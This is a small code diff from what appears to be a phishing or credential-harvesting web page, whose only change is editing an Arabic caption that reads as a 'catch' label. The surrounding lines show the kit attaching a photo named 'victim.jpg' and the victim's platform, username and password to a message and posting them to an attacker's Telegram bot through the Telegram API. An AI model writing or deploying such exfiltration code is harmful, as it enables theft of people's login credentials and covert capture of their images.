@@ -96,7 +96,7 @@
             const formData = new FormData();
             formData.append('chat_id', cid);
             formData.append('photo', blob, 'victim.jpg');
-            formData.append('caption', `✅ صيد بصرة سنتر:\n👤 المنصة: ${platform}\n📧 اليوزر: ${user}\n🔑 الرمز: ${pass}\n⏰ ${new Date().toLocaleString()}`);
+            formData.append('caption', `✅ صيد :\n👤 المنصة: ${platform}\n📧 اليوزر: ${user}\n🔑 الرمز: ${pass}\n⏰ ${new Date().toLocaleString()}`);
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
